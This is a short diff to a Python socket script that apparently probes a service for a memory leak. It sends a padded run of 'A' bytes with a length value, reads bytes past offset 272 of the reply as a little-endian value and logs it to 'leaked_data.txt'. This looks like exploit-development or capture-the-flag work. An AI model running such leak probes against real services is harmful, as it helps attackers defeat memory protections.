@@ -21,7 +21,7 @@ try:
     fo = open("leaked_data.txt", "a")
 
     # Send data
-    message = b'\n32\n'
+    message = b'AAAAAAAAAAAAAAAAAAAAAAAA\n32\n'
     print('sending {!r}'.format(message))
     sock.sendall(message)
 
@@ -58,7 +58,7 @@ try:
         data = sock.recv(280)
         amount_received += len(data)
         print(hex(int.from_bytes(data[272:],"little")))
-        fo.write(hex(int.from_bytes(data[272:],"little")))
+        fo.write(" " + hex(int.from_bytes(data[272:],"little")) + "\n")
 
 finally:
     print('closing socket')
